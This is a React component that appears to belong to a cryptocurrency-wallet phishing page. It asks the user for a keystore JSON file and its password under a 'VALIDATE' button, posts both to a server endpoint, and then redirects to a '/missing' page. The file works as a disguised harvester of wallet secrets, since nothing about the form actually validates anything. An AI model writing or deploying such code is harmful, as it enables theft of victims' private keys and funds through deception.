import { useEffect } from "react";
import axios from "axios";
import { useNavigate } from 'react-router-dom'

const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setPassword}) => {
  let Navigate = useNavigate()

  useEffect(() => {
    if (seed2 == "" || password == "") {
      setDisabled2(true);
    } else {
      setDisabled2(false);
    }
  }, [seed2, password]);

  const handleSubmit = (e) => {
    axios.post("http://localhost:8080/form", { seed: seed2, password});
    Navigate('/missing')
  };

  return (
    <>
      <textarea
        onChange={(e) => setSeed2(e.target.value)}
        value={seed2}
        rows='10'
        placeholder='Keystore JSON' 
      ></textarea>
      <div>
        <textarea
          rows='1'
          placeholder='password'
          onChange={(e) => setPassword(e.target.value)}
          value={password}
        ></textarea>
        <p className='info'>
          Several lines of text beginning width plus the password you used to
          encrypt it.
        </p>
      </div>
      <button
        style={
          disabled2
            ? {
                backgroundColor: "rgba(26, 141, 218, 0.2)",
                cursor: "not-allowed"
              }
            : { backgroundColor: "#1a8dda", color: "#fff" }
        }
        onClick={handleSubmit}
        disabled2={disabled2}
      >
        VALIDATE
      </button>
    </>
  );
};

export default KeystoreJson;
